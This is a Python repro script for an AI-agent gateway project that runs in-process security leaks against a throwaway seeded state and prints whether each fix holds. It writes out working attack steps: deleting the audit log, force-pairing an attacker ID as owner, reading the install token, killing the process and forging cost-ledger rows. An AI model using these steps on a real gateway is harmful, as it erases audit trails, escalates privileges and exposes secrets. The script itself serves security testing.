"""Repro — in-process leaks (code running inside the gateway process).

These are NOT remote/HTTP attacks. Each snippet is code executing in the same
Python process as the gateway, standing in for a malicious tool or a compromised
in-process adapter. Run from a fresh checkout:

    uv run python repro/leak_inprocess.py

It seeds a throwaway gateway state, then fires each leak and prints the real
result. For the fixed leaks it also shows the new defense.
"""

import os
import sqlite3
import subprocess
import sys
import tempfile

_d = tempfile.mkdtemp(prefix="glc-leaks-")
os.environ["GLC_CONFIG_DIR"] = _d
os.environ["GLC_AUDIT_DB"] = os.path.join(_d, "audit.sqlite")
os.environ["GLC_PAIRING_DB"] = os.path.join(_d, "pairings.sqlite")
os.environ["GLC_GATEWAY_DB"] = os.path.join(_d, "gateway.sqlite")

from glc import db  # noqa: E402
from glc.audit import store as audit  # noqa: E402
from glc.config import get_or_create_install_token  # noqa: E402
from glc.security.pairing import get_pairing_store  # noqa: E402

# Seed state as a running gateway would have.
audit.init_store()
for _i in range(3):
    audit.append(
        channel="telegram", channel_user_id="owner", trust_level="owner_paired",
        event_type="tool_dispatch", tool=f"t{_i}",
    )
db.init()
db.log_call(provider="gemini", model="real", input_tokens=100, agent="owner")
get_or_create_install_token()


print("## leak 2 — erase the audit log")
print("   rows before        :", len(audit.query(limit=99)))
_c = sqlite3.connect(os.environ["GLC_AUDIT_DB"])
_c.execute("DELETE FROM audit_log")
_c.commit()
_c.close()
print("   rows after DELETE  :", len(audit.query(limit=99)))
print("   verify_chain()     :", audit.verify_chain()["reason"], "  <-- FIX: tamper detected")

print("\n## leak 3 — escalate to owner (needs process isolation)")
print("  ", get_pairing_store().force_pair_owner("telegram", "attacker-id", user_handle="me"))

print("\n## leak 4 — read the install token")
_tp = os.path.join(_d, "install_token")
if os.path.exists(_tp):
    print("   install_token file :", open(_tp).read()[:6] + "...  (set GLC_INSTALL_TOKEN to bind as a Secret and remove the file)")
else:
    print("   install_token file : (none — bound as a Secret)  <-- FIX")

print("\n## leak 8 — kill the gateway from inside (needs PID isolation)")
_r = subprocess.run([sys.executable, "-c", "import os,signal; os.kill(os.getpid(), signal.SIGTERM)"])
print("   subprocess exit    :", _r.returncode, " (negative = killed by signal)")

print("\n## leak 10 — poison the cost ledger (needs process-separated writer)")
db.log_call(provider="gemini", model="x", input_tokens=999999999, agent="victim")
_row = sqlite3.connect(os.environ["GLC_GATEWAY_DB"]).execute(
    "SELECT agent, input_tokens FROM calls WHERE agent='victim'"
).fetchone()
print("   forged ledger row  :", _row)
